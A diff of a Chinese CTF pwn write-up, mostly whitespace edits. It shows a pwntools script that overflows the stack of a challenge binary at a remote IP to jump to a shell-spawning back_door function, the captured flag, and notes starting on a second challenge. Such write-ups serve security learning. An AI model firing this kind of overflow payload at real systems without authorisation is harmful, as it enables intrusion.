@@ -40,23 +40,32 @@ back_door 函数直接包含 sh
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831230057302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
 ```python
 from pwn import *
+
+
 #p=process('./babybabystack')
+
 p=remote('148.70.206.225',50001)
 
 bin_addr=0x8048569
+
 pay='a'*(0x1c+4)+p32(bin_addr)
 p.sendline(pay)
 
 p.interactive()
 ```
 得到 flag
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2019083123091338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
+
 `flag: flag{5t4ck_0v3rF10w_15_u53fu1}`
 
 #### string&float
+
 checksec 检查
 64 位,开了 NX 和 Canary,心里慌得一批
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831231416837.png)
+
 上 IDA
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2019083123245019.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
 可以看出得到 flag 的条件是 login 函数返回 true
@@ -302,6 +311,6 @@ int main(){
 }
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTgwMzQ4NDc3Myw2OTc3OTExODgsLTM5Nz
+eyJoaXN0b3J5IjpbMjA3MTAzMzA5Nyw2OTc3OTExODgsLTM5Nz
 kyNzQxNF19
 -->
